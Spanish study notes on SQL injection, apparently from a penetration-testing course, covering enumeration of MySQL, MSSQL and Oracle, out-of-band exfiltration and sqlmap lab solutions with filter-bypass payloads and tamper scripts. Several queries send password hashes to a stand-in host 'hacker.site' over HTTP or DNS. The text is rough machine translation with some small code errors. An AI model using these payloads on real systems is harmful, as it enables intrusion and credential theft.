# SQL Injection

Comprenación básica de las vulnerabilidades de inyección de SQL

Concepto avanzado de la explotación de SQLi's

## Intro

Vamos a sentar las bases para una comprensión avanzada de lo que el mundo de la inyección SQL ofrece. Analizaremos el DBMS más común y aprenderemos a realizar ataques avanzados contra ellos.

### Recap and More

SQL Injection es un ataque contra el propósito original que un desarrollador ha elegido Para una pieza específica de código SQL. La idea es alterar la estructura de consulta SQL original aprovechando las funcionalidades de sintaxis, DBMS y/o OS con el fin de realizar operaciones maliciosas.

Analizaremos 3 sistemas de gestión de bases de datos de relacionales más utilizados RDBMS:

```
- MySQL
- SQL Server
- Oracle
```

## Exploiting SQLI

### Techniques Classification

Clases de ataque:

```
- INBAND
- OUT-OF-BAND
- INFERENCE
```

### Inbound Attacks

Apalanca el mismo canal utilizado para inyectar el código SQL

El resultado de este ataque se incluye directamente en la respuesta de la aplicación web vuln.

Las técnicas más comunes son:

```
- UNION-based
- Error-based
```

### Out-of-Band Attacks (OOB)

Utiliza canales alternativos para extraer datos del servidor.

Algunas de ellas incluyen las siguientes:

```
- HTTP(s) requests
- DNS resolution
- Email
- File System
```

* Explotar una SQLi usando métodos OOB es útil cuando todas las técnicas de Inband han fallado porque los vectores intentados han sido deshabilidos, limitados o filtrados. Cuando la única opción es utilizar \*\* Técnicas ciegas (Inferencia) \*\*, reducir el número de consultas es una necesidad.

Explotación de OOB basada en HTTP:

```
- envía el resultado de la consulta SQL por petición HTTP, generalmente a través de GET, hacia un servidor HTTP controlado por hackers
```

### Inference Attacks

* Más común conocido como **Blind**.
* Todos los métodos que permiten la extracción de información se basan en un conjunto de deducciones enfocadas. Hay varias técnicas posibles de usar, pero las más comunes son:
* Boolean, a base de booleano.
* Basado en el tiempo

### Boolean-based

El enfoque en los cambios visibles dentro de las respuestas del servidor web. Por ejemplo:

Si el resultado de una consulta no es NULL, el servidor devuelve **Great** mientras **Nooo** de lo contrario.

Ejemplo:

```
- Is the first character of the username a 'G'?
- If yes = 'great' / if no = 'nooo'
```

### Time-based

Se centra en los retrasos de la respuesta

Ejemplo:

```
- Is the first character of the username a 'G'?
- if yes = 'waits 15 seconds' / if not = 'answer imediately any message'
```

## Gathering Information from the Environment

Antes de explotar tenemos que entender algunos fundamentos básicos sobre nuestro backend DBMS

Las técnicas de huellas dpresión pueden variar en:

```
- Non-Blind
- Blind
```

Nuestros objetivos:

```
- DMBS version
- Databases structure and Data
- Database Users and their privileges
```

## Identifying the DBMS

### Error Code Analysis

El método más sencillo consiste en forzar la aplicación de vuln a devolver un mensaje de error. Cuanto más verbós son los errores del servidor, mejor.

### Banner Grabbing

A veces, el análisis de código de error no devuelve ningún detalle, como el nivel exacto de la versión y el parche; sin embargo, sí devuelve el nombre de la base de datos.

La mejor manera de identificar el DBMS es aprovechando el escenario NON-Blind. Cada DB implementa funciones específicas que devuelve la versión actual, por lo que recuperar ese valor es sencillo.

* Ejemplo en imágenes

### Educated Guessing

* Si nos enfrentamos a un escenario de BLIND, podemos ejecutar Incuperación Educada de lo que hay detrás del punto de inyección.

### String Concatenation

* Cada DBMS maneja las cuerdas de manera diferente, haciendo que la forma en que la Concatenación de Cadena se maneja aún más interesante.
* ejemplo en imágenes

### Numeric Functions

Si el punto de inyección se evalúa como un **número**, podemos realizar el mismo enfoque, pero con funciones numéricas

* Ejemplo en imágenes

### SQL Dialect

Podemos usar Fecha y Tiempo Funciones (ver NOW()0 en MySQL) o específicas DBMS Funciones Diversos (ver UID en Oracle). Y muchos más...

Otra opción, es cómo se manejan **comments**.

```
- MySQL: https://dev.mysql.com/doc/refman/8.0/en/comments.html
```

MySQL proporciona una variante a C-Style comments:

```sql
/*! MySQL-specific code */
```

Esto es útil para hacer una buena técnica **obfuscator**.

Ejemplo:

```sql
SELECT 1 /*!50530 + 1 */  # executed only by server MySQL 5.5.30 or higher
```

### Enumerating the DBMS Content

La forma más inteligente de empezar es enumerando en este orden:

```
- Databases schemas
- Tables
- Columns
- Users
```

Esta información también se conoce como **metadata**, **system catalog** o **diccionario de datos**\*\*

#### In MySQL

→ https://dev.mysql.com/doc/refman/8.0/en/information-schema.html

Information.schema es el lugar mágico donde podemos recuperar todos los metadatos requeridos.

Toda la información sobre las otras bases de datos se almacenan dentro de la tabla SCHEMATA.

```sql
SELECT schema_name FROM information_schema.schemata;
```

Si el usuario que ejecuta MySQL tiene privilegios SHOW, entonces el comando anterior se puede condensar en esto:

```sql
SHOW databases;
SHOW schemas;
```

MySQL proporciona una lista de funciones útiles y operadores

→ https://dev.mysql.com/doc/refman/8.0/en/information-functions.html

Podemos usar:

```sql
SELECT DATABASE();
SELECT SCHEMA();
```

#### In MSSQL

Toda la información a nivel del sistema se almacena dentro de las Tablas de Sistema:

```
http://msdn.microsoft.com/en-us/library/ms179932.aspx
```

Dependiendo de la versión, estas tablas existen sólo en la base de datos MASTER o en cada base de datos

```
https://docs.microsoft.com/en-us/sql/relational-databases/databases/master-database?redirectedfrom=MSDN&view=sql-server-ver15
```

Información sobre las bases de datos se almacena en la tabla del sistema: **sysdatabases**

consulta:

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM sysdatabases;
```

La alternativa es SYSTEM VIEWS → http://msdn.microsoft.com/en-us/library/ms177862.aspx

Las vistas más interesantes:

```
- Compability: http://msdn.microsoft.com/en-us/library/ms187376.aspx
- Information: http://msdn.microsoft.com/en-us/library/ms186778.aspx
- Schema     : http://msdn.microsoft.com/en-us/library/ms186778.aspx
```

Para una cartografía entre las tablas del sistema y las vistas del sistema:

```
http://msdn.microsoft.com/en-us/library/ms187997.aspx
```

También podemos usar **Catalog** view:

```sql
SELECT name FROM SYS.databases;
```

Podemos aprovechar una función de utilidad:

```sql
SELECT DB_NAME();
```

Proporcionar un pequeño ID, para que podamos recuperar la información sobre una base de datos específica:

```
SELECT DB_NAME(1);
```

Una lista de nombres e identificaciones:

```sql
SELECT dbid, DB_NAME(dbid) from master..sysdatabases;
```

#### In Oracle

No tiene un sistema modelo simple como los dos anteriores.

Concepts to understand:

```
Database: Where are stored the physical files
Instance: The pool of processes, memory areas, etc. Useful to access data.
```

Cada DATABASE debe apuntar a una INSTANCE que tiene sus estructuras lógicas y físicas custon para almacenar información como tablas, índices, etc.

La estructura más importante: **TABLESPACE**

Enumería el TABLESPACE que el usuario actual puede utilizar:

```sql
SELECT TABLESPACE_NAME FROM USER_TABLESPACES
```

**SYSTEM** y **SYSAUX** son el sistema **TABLESPACE** creado automáticamente al principio cuando se hace la base de datos.

Si queremos recuperar el valor predeterminado **TABLESPACE**:

```sql
SELECT DEFAULT_TABLESPACE FROM USER_USERS
SELECT DEFAULT_TABLESPACE FROM SYS.USER_USERS
# The USER_USERS is the table in SYS that describes the current user
```

### Tables & Columns

#### MySQL

→ http://dev.mysql.com/doc/refman/5.0/en/tables-table.html

**INFORMATION\_SCHEMA.TABLES** es la tabla que proporciona información sobre tablas en las bases de datos gestionadas.

Podemos dirigir la siguiente consulta:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```

El alias:

```sql
SHOW TABLES; //current schema
SHOW TABLES in EMPLOYEES; // other database
```

Las columnas están dentro de la INFORMATION\_SCHEMA.COLUMNS:

```sql
SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;
```

alias:

```sql
SHOW COLUMNS FROM DEPARTMENTS IN EMPLOYEES; # cols in a table, database
```

#### MSSQL

Información sobre las tablas se almacenan en el interior de **sysobjects**

→ http://technet.microsoft.com/en-us/library/aa260447(v=sql.80).aspx

Esta tabla contiene información sobre todos los objetos definidos Para eso específico schema:

```
SELECT name FROM sysobjects WHERE xtype='U'
```

Para recuperar la lista de tablas: // añadir el nombre de la base de datos antes de **sysobjects**

```sql
SELECT name FROM employees..sysobjects WHERE xtype='U'

# the xtype defines objects types:
- S  = System Table
- U  = User Table
- TT = Table Type
- X  = Extended Stored Procedure
- V  = Views
```

Alternativa, **INFORMATION\_SCHEMA** vistas que podemos recuperar información sobre tablas y vistas de la base de datos actual

```sql
SELECT table_name FROM INFORMATION_SCHEMA.TABLES
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE'
```

Para una base de datos específica, sólo tiene que añadir el nombre del db antes de:

```sql
SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES
SELECT table_name FROM employees.INFORMATION_SCHEMA.TABLES WHERE table_type = 'BASE TABLE'
```

La enumeración de columnas es similar:

```sql
SELECT name FROM syscolumns
SELECT name FROM employees.syscolumns
```

Alternativa, utilizando INFORMATION\_SCHEMA:

```sql
SELECT column_name FROM INFORMATION_SCHEMA.columns
SELECT column_name FROM employees.INFORMATION_SCHEMA.columns
SELECT column_name FROM employees.INFORMATION_SCHEMA.columns WHERE table_name='salary'
```

#### Oracle

ts una simple consulta

```sql
# https://docs.oracle.com/cd/B28359_01/server.111/b28320/statviews_2105.htm#REFRN20286

SELECT table_name, tablespace_name FROM SYS.all_tables
SELECT table_name, tablespace_name FROM all_tables
```

Hay una tabla especial en el nombre de Oracle **DUAL**

```
https://docs.oracle.com/cd/B19306_01/server.102/b14200/queries009.htm

SELECT "WAPTx" FROM DUAL;

# Is useful For computing a constant expression with the SELECT statement
```

#### MSSQL

La visión del sistema _ALL\_TAB\_COLUMNS_

https://docs.oracle.com/cd/B28359\_01/server.111/b28320/statviews\_2091.htm

Es útil enumerar las columnas de las tablas, vistas y clústeres accesibles al usuario de los diferentes usuarios:

```sql
SELECT column_name FROM SYS.ALL_TAB_COLUMNS
SELECT column_name FROM ALL_TAB_COLUMNS
```

## Database Users and Privileges

### MySQL

Algunas funciones útiles para hacer el trabajo:

```sql
User()        # FUNCTIONS
Current_user()
System_user()
Session_user()
Current_user  # CONSTANT
```

Si el usuario es privilegiado:

```sql
SELECT user FROM mysql.user;
```

Los privilegios están almacenados en INFORMATION\_SCHEMA

Y organizado por la tables:

```sql
COLUMN_PRIVILEGES
SCHEMA_PRIVILEGES
TABLE_PRIVILEGES()
USER_PRIVILEGES
```

## Puede ser recuperado así.:

## SELECT grantee,privilege.type FROM INFORMATION-SCHEMA.USER-PRIVILEGES;

Para mostrar privilegios en databases:

```
SELECT grantee, table_schema, privilege_type FROM INFORMATION_SCHEMA.SCHEMA_PRIVILEGES;
```

Mostrar privilegios de los respectivos columns:

```
SELECT user, select_priv,..., FROM MYSQL.USER;
```

Para reunir las cuentas de DBA:

```sql
SELECT grantee, privilege_type FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE privilege_type='SUPER';
```

Los usuarios privatizados necesitan cambiar la consulta:

```sql
SELECT user FROM MYSQL.USER WHERE Super_priv='Y';
```

### MSSQL

Es similar al mysql

Tenemos algunas funciones:

```sql
suser_sname() //FUNCTION
User          // CONSTANTS
System_user
```

También podemos utilizar la Tabla de Sistema:

```sql
SELECT loginame FROM SYSPROCESSES WHERE spid = @@SPID
# Current User Process ID

# http://msdn.microsoft.com/en-us/library/ms189535.aspx

SELECT name FROM SYSLOGINS;
# all users
```

Podemos usar Vistas del Sistema:

```sql
SELECT original_login_name FROM SYS.DM_EXEC_SESSIONS WHERE status='running'
# current active user
```

Una vez que identificamos a los usuarios, necesitamos entender su privilegios:

IS\_SRVOLEMEMBER = http://msdn.microsoft.com/en-us/library/ms176015.aspx

```sql
IF IS_SRVOLEMEMBER('sysadmin')=1
# print 'Current users login is a member of the sysadmin role'

ELSE IF IS_SRVOLEMEMBER('sysadmin')=0
# print 'Current users login is NOT a member of the sysadmin role'
```

Además de sysadmin, hay otros papeles posibles:

```
serveradmin
dbcreator
setupadmin
bulkadmin
securityadmin
diskadmin
public
processadmin
```

Podemos utilizar esta función para preguntar sobre otros usuarios:

```
SELECT IS_SRVOLEMEMBER ('processadmin','aw')
# aw is the name of the SQL Server login to check. If the username is supplied as an argument, its the current user.
```

Quién es el dueño de qué?

```
# http://msdn.microsoft.com/en-us/library/ms174355.aspx

SELECT loginname FROM SYSLOGINS where sysadmin=1
```

O podemos usar System View server\_principals:

```
SELECT name FROM SYS.SERVER_PRINCIPALS where TYPE='S'
# S = SQL login
```

### Oracle

Para recuperar al usuario actual:

```sql
SELECT user FROM DUAL
```

Alternativamente:

```sql
SELECT username FROM USER_USERS
SELECT username FROM ALL_USERS
```

Privas de los usuarios:

```sql
SELECT grantee FROM DBA_ROLE_PRIVS
SELECT username FROM USER_ROLE_PRIVS
```

Los actuales privilegios de sesión de los usuarios:

```sql
SELECT role FROM SESSION_ROLES
```

Para recuperar una visión general de todos los data dictionaries, tables and view:

```sql
SELECT * FROM DICTIONARY
SELECT * FROM DICT
```

Clases SQLI:

![[Pasted image 20240311153304.png]]

Podemos inferimos la versión de DBMS observando las respuestas a diferentes sintaxis de concatenación:

![[Pasted image 20240311153315.png]]

Funciones numéricas:

![[Pasted image 20240311153324.png]]

## Out-of-Band Exploitation

Utilice cuando se enfrenta a escenarios de inyección SQL de especial ciegas. En estas situaciones, no podemos confiar en las técnicas inferenciales para recuperar datos.

Estos no funcionarán porque los resultados están siendo limitados, filtrados, y así sucesivamente; por lo tanto, tenemos que optar por otro CHANNEL para llevar esta información.

### Alternative OOB CHannels

Los más relevantes:

```
HTTP
DNS
email
Database Connections
```

### OOB via HTTP

Podemos aprovechar el canal HTTP Para los sistemas DBMS que proporcionan características Para acceder a los datos en Internet a través de HTTP usando SQL

* Utilizando estas características, podemos crear una consulta a un recurso web controlado por el hacker y luego controlar el registro de acceso Para analizar todas las solicitudes llegadas.
* Sólo Oracle proporciona esta característica de manera nativa

Dos técnicas \[ Oracle ]:

```
UTL_HTTP

# HTTPURIType: https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/t_dburi.htm#BGBGAHAA
```

Oracle URL\_HTTP package → https://docs.oracle.com/cd/B19306\_01/appdev.102/b14258/u\_http.htm

* Puede utilizar tanto a través de SQL como PL/SQL

Dos divertidos útiles:

```
REQUEST
REQUEST_PIECES
```

Only the REQUEST can be used in a SQL query:

```sql
SELECT UTL_HTTP.REQUEST ('hacker.site/'||(SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1)) FROM DUAL;
```

The REQUEST\_PIECES debe utilizarse en a PL/SQL Block \*example in images

Oracle HTTPURITYPE Package

* La primera es a menudo desactivada.

También podemos exfiltrar información a través de HTTP:

```sql
SELECT HTTPURITYPE ('hacker.site'/||(SELECT spare4 FROM SYS.USER$ WHERE ROWNUM=1)).getclob() FROM DUAL;

# getclob() method returns the character large object (CLOB), but we can also use other methods such as: GETBLOB(), GETXML() and GETCONTENTTYPE()
```

### OOB via DNS

En este contexto, en lugar de controlar el servidor web tenemos que controlar un servidor DNS.

> Incluso si el administrador establece una política agresiva de cortafuneros que filtra cualquier conexión saliente, el sitio de la víctima todavía podrá responder a las solicitudes y realizar consultas DNS.

* El servidor utiliza un solucionador DNS configurado por el administrador de la red, pero el solucionador necesita ponerse en contacto con un servidor DNS bajo el control de los atacantes, por lo que devuelve los resultados de la inyección al atacante.
* Como requisito, el hacker debe tener acceso al servidor DNS.

> El servidor debe ser registrado como el servidor de nombres autorizado para esa zona (por ejemplo, hacker.site)

Provocando peticiones de DNS

#### MySQL (win)

Función: LOAD-FILE() lee el archivo y devuelve el contenido del archivo como una cadena:

```sql
SELECT LOAD_FILE("C:\\Windows\\system.uni");
```

Podemos explotar esta función y provocar las solicitudes de DNS solicitando una ruta de UNC como esta: \[data].hacker.site

```sql
SELECT LOAD_FILE(CONCAT('\\\\', 'SELECT password FROM mysql.user WHERE user=\'root\'','.hacker.site'));
```

#### MSSQL

Podemos provocar solicitudes de DNS usando **Caminos de UNC** como lo hicimos con MySQL

Podemos utilizar el procedur extendido almacenadoe MASTER..XP\_FILEEXIST determinar si existe un archivo en particular en el disco o no.

```sql
EXEC MASTER..XP_FILEEXIST 'C:\Windows\system.ini'
```

* 2 alternativas son **XP-DIRTREE** y **XP-SUBDIRS**
* Además en imágenes

#### Oracle

**UTL\_INADDR** paquete con las funciones **GET\_HOST\_ADDRESS** and **GET\_HOST\_NAME**

```sql
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacket.site') FROM DUAL
SELECT UTL_INADDR.GET_HOST_NAME((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.hacket.site') FROM DUAL
```

También funciones/paquetes como:

```sql
HTTPURITYPE.GETCLOB
UTL_HTTP.REQUEST
DBMS_LDAP.INIT
```

> Se puede utilizar, pero depende de la versión de Oracle

Se puede automatizar con SQLMAP

→ http://www.slideshare.net/stamparm/dns-exfiltration-using-sqlmap-13163281

## Exploiting Second-Order SQL Injection

* Las inyecciones SQL de segundo orden son extremadamente poderosas, al igual que su equivalente en el espacio de primer orden; Sin embargo, debido a su naturaleza, son más difíciles de detectar.
* El exploit se presenta en una sola solicitud y desencadenante cuando la solicitud se encarga de una solicitud diferente.
* Los escáneres automatizados modernos son incapaces de realizar la metodología rigurosa necesariaPara descubrir vulnerabilidades de segundo orden
* Porque hay varios escenarios posibles

### Lab

* Imagen de carga
* ir a **Lista de firmas de archivos** en wikipedia
* Ver el valor de los archivos jpg

Trate de aumentar el valor con código php en él

```php
<?php phpinfo();
```

Trate de abrir la imagen subida, si la página tiene manejador de php abrirá el phpinfo

```sql
# If not, procced to test the file name with BURP > Repeater
filename="example.php' and true -- -"

# If the number of view increase, lets try with UNION this time
filename="example.php' UNION SELECT @@VERSION; -- -"
filename="' UNION SELECT @@VERSION; -- -" //take off the name of the file
filename="' UNION SELECT SCHEMA(); -- -"
filename="' UNION SELECT GROUP_CONCAT(table_name) from information_schema.tables where table_schema = SCHEMA(); -- -"
```

nuestro escenario:

```
[>] Injection
Name of the file uploaded, e.g. ' union select @version; -- -
** via POST request **
```

```
[*] Execution
view.php?file={our_payload}
** via GET request **
```

Abajo:

```
sqlmap (2nd order) works only GET to GET i.e. we beed a python plugin
burp needs a java plugin
```

Altos:

```
out php script

1. GETs the payload in input
2. Generates the respective image payload (POST req)
3. Generates the respective GET req, to view page and reflect the result client-side
```

* So we create a php page, opened with apache2 server to execute payloads

Ejemplo:

```
hacker.site/payload.php?payload='UNION SELECT USER(); -- -
```

Termina el trabajo con SQLMAP

```sql
sqlmap -u 'http://hacker.site/payload.php?payload=x' --technique=U --banner

--flush-session --batch --banner
# test the time difference between Time-based and Union-based
# Time 0 is 3min long, Union is 2sec
```

Tenemos que pre-elaborar el formulario antes de presentar la solicitud.

## Lab Solutions

### SQLi 1

PoC:

```bash
GET / HTTP/1.1
Host: 1.sqli.labs
User-Agent: ' UNION SELECT user(); -- -
```

SQLMap Automation:

```
sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
```

### SQLi 2

```bash
UNION and standard payloads like 1='1 are filterer.

PoC, False Blind:
GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: ' or 'elscustom'='elsFALSE


PoC, True Blind:
GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: ' or 'elscustom'='elscustom


# SQLMap Automation:
sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner
```

### SQLi 3

Los espacios están filtrados.

PoC:

```bash
GET / HTTP/1.1
Host: 3.sqli.labs
User-Agent: '/**/UNION/**/SELECT/**/@@version;#

# SQLMap Automation:
sqlmap -u 'http://3.sqli.labs/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner
```

### SQLi 4

Comentarios no más largos trabajo.

PoC:

```bash
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'UNION(select('PoC String'));#


# We cannot easily automate this task, as sqlmap should balance the parentesis.
# To exploit by hand you have to first find the tables in the current database:


GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#

Then you can enumarate the columns:

GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
```

### SQLi 5

Esto es similar a SQLi 4, pero el desarrollador usó dobles-cuotas alrededor de las cuerdas.

PoC:

```bash
GET / HTTP/1.1
Host: 5.sqli.labs
User-Agent: "UNION(select('PoC String'));#

# To exploit by hand you have again to find the tables in the current database:

GET / HTTP/1.1
Host: 5.sqli.labs
User-Agent: "union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
```

### SQLi 6

Las palabras reservadas de MySQL han sido filtradas. Usar **El caso RaNDom** no ayuda, como puede tener, por ejemplo, algo así como _InfoRMaTIon-ScheMa_ que se convertirá en _InfoRMaTI-ScheMa_, ya que _on_ o _ON_ es una palabra reservada válida.

PoC:

```bash

GET / HTTP/1.1
Host: 6.sqli.labs
User-Agent: ' UNiOn seLect @@versiOn;#

The only way to get around this kind of filtering during the exploitation automation phase is to use DifFeReNt CaSe for every letter
You have to write a simple tampering script:
```

```python
#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces each keyword with a CaMeLcAsE VeRsIoN of it.

    >>> tamper('INSERT')
    'InSeRt'
    """

    ret_val = ""

    if payload:
        for i in range(len(payload)):
            if i % 2 == 0:
                # We cannot break 0x12345
                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
                    ret_val += payload[i].upper()
                else:
                    ret_val += payload[i]
            else:
                ret_val += payload[i].lower()
    return ret_val
```

SQLMap command line:

```bash
sqlmap -u 'http://6.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/camelcase.py --prefix="nonexistent'" --suffix=';#' --union-char=els --banner
```

### SQLi 7

En este escenario, el filtro insensible al caso corta todas las palabras reservadas, pero el filtro no es recursivo.

PoC:

```bash
GET / HTTP/1.1
Host: 7.sqli.labs
User-Agent: ' uZEROFILLnZEROFILLiZEROFILLoZEROFILLnZEROFILL ZEROFILLsZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt ZEROFILL@@ZEROFILLvZEROFILLeZEROFILLrZEROFILLsZEROFILLiZEROFILLoZEROFILLnZEROFILL; ZEROFILL-- ZEROFILL-ZEROFILL
```

Tampering script:

```python
#!/usr/bin/env python

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Insert FILL after every character

    >>> tamper('INSERT')
    'IfillNfillSfillEfillRfillTfill
    """

    retVal = str()

    FILL = 'ZEROFILL'

    if payload:
        for i in range(len(payload)):
            retVal += payload[i] + FILL
    # Uncomment to debug
    # print "pretamper:", payload
    return retVal

```

SQLMap automation:

```bash
sqlmap -u 'http://7.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --banner
```

### SQLi 8

Codificación de URL simple.

PoC:

```bash
GET / HTTP/1.1
Host: 8.sqli.labs
User-Agent: %61%61%61%61%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%3b%20%2d%2d%20%2d

SQLMap Automation:

sqlmap -u 'http://8.sqli.labs/' -p user-agent --tamper=charencode --technique=U --banner
```

### SQLi 9

Doble codificación.

PoC:

```bash
GET / HTTP/1.1
Host: 9.sqli.labs
User-Agent: %25%36%31%25%36%31%25%36%31%25%36%31%25%32%37%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%34%30%25%34%30%25%37%36%25%36%35%25%37%32%25%37%33%25%36%39%25%36%66%25%36%65%25%33%62%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64

SQLMap Automation:

sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner
```

### SQLi 10

Este laboratorio combina el filtrado de palabras clave del reservar con una inyección en una función.

PoC:

```bash
GET / HTTP/1.1
Host: 10.sqli.labs
User-Agent: ') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -

SQLMap Automation:

sqlmap -u 'http://10.sqli.labs/' -p user-agent --technique=U --tamper=/path/to/your/tampering/scripts/fill.py --prefix="notexistant')" --suffix="; -- " --union-char=els --banner
```

> \[Note] Diferentes versiones sqlmap pueden requerir diferentes opciones/flags. Por ejemplo, en relación con el nivel 9:

```bash
sqlmap -u 'http://9.sqli.labs/' -p user-agent --tamper=chardoubleencode --technique=U --banner --level=3 --risk=3

or

sqlmap -r 9.sqli.labs.For.sqlmap --banner --tamper=chardoubleencode --dbms mysql --batch --union-char=els  --technique=E

# The only one that worked
# lvl 10 didnt work either
```
